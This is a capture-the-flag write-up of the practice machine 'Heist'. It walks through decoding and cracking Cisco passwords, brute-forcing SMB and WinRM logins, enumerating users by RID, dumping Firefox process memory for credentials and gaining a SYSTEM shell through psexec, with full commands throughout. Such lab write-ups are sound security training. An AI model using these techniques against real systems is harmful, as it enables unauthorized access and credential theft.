# Heist

This is the write-up for the box Heist that got retired at the 30th November 2019.
My IP address was 10.10.14.5 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.149    heist.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/heist.nmap 10.10.10.149
```

```markdown
PORT    STATE SERVICE       VERSION    
80/tcp  open  http          Microsoft IIS httpd 10.0       
| http-cookie-flags:          
|   /:                                                                                            
|     PHPSESSID:                             
|_      httponly flag not set                                                                     
| http-methods:                              
|_  Potentially risky methods: TRACE             
|_http-server-header: Microsoft-IIS/10.0     
| http-title: Support Login Page                                                                  
|_Requested resource was login.php           
135/tcp open  msrpc         Microsoft Windows RPC   
445/tcp open  microsoft-ds?                  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Checking HTTP (Port 80)

The web page forwards to _/login.php_ and shows a login page to a web application:

![Login page](https://kyuu-ji.github.io/htb-write-up/heist/heist_web-1.png)

When trying out an username, it says to enter an email address.
The button _"Login as guest"_ forwards to _/issues.php_ which looks like a help desk page with a service ticket and an attachment:

![Service ticket](https://kyuu-ji.github.io/htb-write-up/heist/heist_web-2.png)

The username _hazard_ could be a potential username.
The attachment forwards to _/attachments/config.txt_ and looks like a snippet of a **Cisco configuration** with the following interesting information:

```markdown
version 12.2
service password-encryption

security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91

username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408

(...)
```

Cisco devices have [different password type levels](https://learningnetwork.cisco.com/s/article/cisco-routers-password-types) and in this case the _password level 7_ refers to a string that is encrypted with a **Vigenere Cipher** that is not secure anymore.

It can be cracked with the [Cisco Type 7 Password Decrypter](https://github.com/theevilbit/ciscot7) on GitHub:
```markdown
python ciscot7.py --decrypt -p 0242114B0E143F015F5D1E161713

python ciscot7.py --decrypt -p 02375012182C1A1D751618034F36415408
```

1. Password: _$uperP@ssword_
2. Password: _Q4)sJu\Y8qz*A3?d_

There is also a _secret level 5_ password for _enabling the admin privileges_, which is a Cisco-specific kind of MD5crypt, that can be cracked with **Hashcat**:
```markdown
hashcat -m 500 heist_cisco.hash /usr/share/wordlists/rockyou.txt
```

After a while it gets cracked and the password is: _stealth1agent_

Now we got different passwords and usernames and use this information to attack the server with a **Password Brute-Force attack**.

## Checking SMB (Port 445)

To brute-force the SMB shares, I will use the tool [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec):
```markdown
crackmapexec smb -u users.txt -p passwords.txt --shares 10.10.10.149
```

The same is possible with **Metasploit**:
```markdown
use auxiliary/scanner/smb/smb_login

setg USER_FILE users.txt
setg PASS_FILE passwords.txt
setg RHOSTS 10.10.10.149

run
```

The username _hazard_ with the password _stealth1agent_ is a valid username but is unprivileged to connect to the shares.
To move laterally with the credentials, it could be possible to use **Windows Remoting (WinRM)** that listens normally on port 5985 and 5986.

Testing if this is possible with a module in **Metasploit** with the same options as before:
```markdown
use auxiliary/scanner/winrm/winrm_login
```

Unfortunately it is unsuccessful.

### Enumerating Usernames

With credentials, it is possible to enumerate the box more with scripts from the **Impacket Framework**.
An enumeration method called **RID / SID Brute-Force** will display the users on the box:
```markdown
python3 /usr/share/doc/python3-impacket/examples/lookupsid.py 'hazard:stealth1agent'@10.10.10.149
```
```markdown
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
```

It gives us three more usernames to put into the _users.txt_ file.

This works by using **RPC calls** which can also be manually accessed with **rpcclient**:
```markdown
rpcclient -U 'hazard%stealth1agent' 10.10.10.149
```

Looking up names and SIDs of users:
```markdown
lookupnames administrator

S-1-5-21-4254423774-1266059056-3197185112-500
```

Looking up the usernames of the next users by changing the last digits:
```markdown
lookupsids S-1-5-21-4254423774-1266059056-3197185112-501
lookupsids S-1-5-21-4254423774-1266059056-3197185112-502
lookupsids S-1-5-21-4254423774-1266059056-3197185112-503
(...)
```

And that is how other usernames can be brute-forced.

After putting the new usernames into the _users.txt_ and running the _use auxiliary/scanner/winrm/winrm_login_ again, it shows that the user _chase_ with the password _Q4)sJu\Y8qz*A3?d_ are valid credentials.

To connect via WinRM, I will use the tool [Evil-WinRM](https://github.com/Hackplayers/evil-winrm):
```markdown
ruby evil-winrm.rb -u chase -p 'Q4)sJu\Y8qz*A3?d' -i 10.10.10.149
```

This starts a shell on the box as _chase_.

## Privilege Escalation

Lets search through all files of _chase_ by going to the home folder in _C:\Users\Chase_ and display files and sub-directories recursively:
```markdown
gci -recurse . | select fullname
```

There is nothing interesting in there.
After searching for installed programs and running processes, it seems that **Firefox** is installed and can be found in the running processes:
```markdown
dir "C:\Program Files"

Get-Process
```
```markdown
PID     name
320     firefox
6408    firefox
6624    firefox
6812    firefox         
6936    firefox
```

The contents of the process can be dumped with **Sysinternals tool procdump** that has to be uploaded first and **Evil-WinRM** has an uploading function by default:
```markdown
upload procdump64.exe
```

The contents can be dumped with the corresponding PID of the process:
```markdown
procdump64.exe -ma 320
```

It creates a dump file that can be downloaded for analysis:
```markdown
download firefox.exe_201026_011809.dmp
```

Searching the dumpfile for passwords:
```markdown
strings firefox.exe_201026_011809.dmp | grep password | less
```

At the top is a password for the web interface from the beginning:
> 4dD!5}x/re8]FBuZ

Lets put _administrator_ into _users.txt_ and this new password into _passwords.txt_ and try another password spraying attempt with the module _auxiliary/scanner/smb/smb_login_:
```markdown
use auxiliary/scanner/winrm/winrm_login
```

The credentials for _administrator_ with the new found password _4dD!5}x/re8]FBuZ_ works and we can try to connect to the box via **Psexec**:
```markdown
python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.149
```

After putting in the password, it starts a shell session as _NT AUTHORITY\SYSTEM_!
